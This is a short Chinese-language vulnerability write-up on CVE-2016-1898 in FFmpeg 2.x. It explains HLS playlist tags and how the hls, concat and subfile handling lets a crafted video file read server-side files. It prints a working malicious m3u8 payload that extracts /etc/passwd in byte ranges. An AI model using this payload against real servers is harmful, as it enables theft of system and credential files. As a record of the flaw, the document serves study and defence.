---
title: （CVE-2016-1898）Ffmpeg 任意文件读取漏洞
id: zhfly2939
---

# （CVE-2016-1898）Ffmpeg 任意文件读取漏洞

## 一、漏洞简介

CVE-2016-1898可以读取文件任意行

*   #EXTM3U 标签是m3u8的文件头，开头必须要这一行
*   #EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒
*   #EXT-X-VERSION:2 该标签可有可无
*   #EXTINF:6, 表示该一段TS流文件的长度
*   #EXT-X-ENDLIST 这个相当于文件结束符

## 二、漏洞影响

FFmpeg 2.x

## 三、复现过程

FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(https://www.0-sec.org/ffmpeg-protocols.html#subfile )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,64,end,128,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,128,end,256,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,256,end,512,,:///etc/passwd
#EXT-X-ENDLIST 
```